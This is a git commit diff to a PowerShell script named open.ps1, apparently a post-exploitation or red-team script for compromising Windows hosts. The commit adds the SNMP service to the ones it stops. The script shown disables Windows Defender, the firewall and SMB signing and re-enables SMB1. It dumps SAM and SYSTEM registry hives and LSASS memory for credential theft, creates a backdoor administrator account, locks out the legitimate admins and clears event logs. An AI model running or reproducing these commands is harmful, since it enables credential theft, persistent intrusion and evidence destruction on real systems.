980877e6eebf4b5ff7c6334f5e2a337e1fccefec
stefanos007 <omgandthreelols@gmail.com>
2024-04-04 13:15:42 +0300

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -8,16 +8,17 @@ Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
 Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
 Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
 Stop-Service -Name "WinDefend" -Force -ErrorAction Ignore
+Stop-Service -Name "SNMP" -Force -ErrorAction Ignore
 Stop-Service -Name "W3SVC" -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 Set-MpPreference -DisableRealtimeMonitoring $true
-#Stop-IISSite -Name "Default Web Site"
 
 Set-Service -Name "WinCollect" -StartupType Disabled
 Set-Service -Name "W3SVC" -StartupType Disabled
+Set-Service -Name "SNMP" -StartupType Disabled
 
 Invoke-Command {reg export 'HKLM\SAM' C:\sam.reg}
 Invoke-Command {reg export 'HKLM\SYSTEM' C:\system.reg}
@@ -26,11 +27,8 @@ Invoke-Command {rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id C:\ls
 New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
 Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
 Remove-LocalGroupMember -Group "Administrators" -Member "algo"
-#Remove-LocalGroupMember -Group "Administrators" -Member "Administrator"
 Disable-LocalUser -Name "algo"
 Disable-LocalUser -Name "Administrator"
-
-#Stop-Process -Name "lsass" -ErrorAction Ignore
 
 Clear-EventLog -LogName System
 Clear-EventLog -LogName Application
